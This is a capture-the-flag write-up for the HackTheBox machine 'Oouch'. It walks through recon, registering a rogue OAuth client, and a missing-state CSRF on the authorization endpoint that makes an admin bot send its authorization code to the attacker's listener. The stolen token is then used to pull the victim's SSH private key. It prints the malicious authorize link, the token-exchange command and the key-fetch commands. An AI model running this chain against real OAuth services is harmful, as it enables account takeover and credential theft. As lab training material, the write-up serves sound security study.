## Overview

Oouch is a Hard Linux box whose user portion is a full lesson in OAuth2 abuse. The path to user: anonymous FTP reveals a two-server OAuth setup, a leaked credential gets us into the application-registration page, a missing `state`/CSRF check on the authorization endpoint lets us steal an admin's authorization code through a contact-form bot, and the resulting access token unlocks an API endpoint that returns the victim's SSH private key.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 21   | FTP (vsftpd) | anonymous login, `project.txt` |
| 22   | SSH (OpenSSH) | key-based login |
| 5000 | nginx → Flask | consumer app (`consumer.oouch.htb`) |
| 8000 | Django | authorization server (`authorization.oouch.htb`) |

```bash
nmap -sC -sV 10.129.29.195
```

Anonymous FTP gives the whole game away:

```bash
curl -s ftp://10.129.29.195/project.txt --user anonymous:anon@x.com
# Flask  -> Consumer
# Django -> Authorization Server
```

![ftp project.txt](/assets/Images/oouch-004_recon_ftp-project.png)

So we have an OAuth2 "consumer" (the client, port 5000) and an "authorization server" (port 8000). Add both vhosts to `/etc/hosts` (or resolve them in your tooling).

## Enumeration

The authorization server at `:8000` lets anyone `/signup/` and `/login/`. The interesting endpoint is `/oauth/applications/register/` — but it returns `401`, gated behind HTTP Basic auth. In the intended chain the gating credential (`develop:<redacted>`) is recovered from the admin's notes after a first OAuth account-link CSRF; it unlocks the client-registration page.

With a Django account **and** the Basic credential, the registration form lets us create our own OAuth client — public, authorization-code grant, with a `redirect_uri` pointing at our own listener.

![register OAuth app](/assets/Images/oouch-005_foothold_oauth-app-register.png)

## Foothold

The authorization endpoint accepts a `GET` and never validates a `state`/anti-CSRF parameter. That means a logged-in victim who simply *opens* an authorize link will mint a code for **our** client and get redirected — code and all — to **our** server.

The consumer's `/contact` form is the delivery channel: a cron-driven admin bot fetches URLs submitted there. We register our own consumer account, submit the authorize link, and wait.

```bash
# delivered via /contact; the admin bot opens it while logged in:
http://authorization.oouch.htb:8000/oauth/authorize/?client_id=<client_id>&response_type=code&redirect_uri=http://<vpn-ip>:9001/token&scope=read&state=&allow=Authorize
```

A simple listener catches the redirect carrying the victim's code:

```
HIT /token?code=<stolen_authorization_code>
```

![CSRF code leak](/assets/Images/oouch-006_foothold_csrf-code-leak.png)

Exchange the stolen code for an access token, then call the resource API. Oouch's `/api/get_ssh` returns the requesting user's **private** SSH key:

```bash
curl -s -d 'grant_type=authorization_code&client_id=<id>&client_secret=<sec>&code=<stolen_code>&redirect_uri=http://<vpn-ip>:9001/token' \
  http://authorization.oouch.htb:8000/oauth/token/
# {"access_token": "<token>", ...}

curl -s http://authorization.oouch.htb:8000/api/get_ssh -H 'Authorization: Bearer <token>'
# -----BEGIN OPENSSH PRIVATE KEY----- ...
```

![token + get_ssh](/assets/Images/oouch-007_foothold_token-getssh.png)

Save the key and log in as `qtc`:

```bash
chmod 600 id_rsa_qtc
ssh -i id_rsa_qtc qtc@10.129.29.195
```

```bash
cat /home/qtc/user.txt   # HTB{...}
```
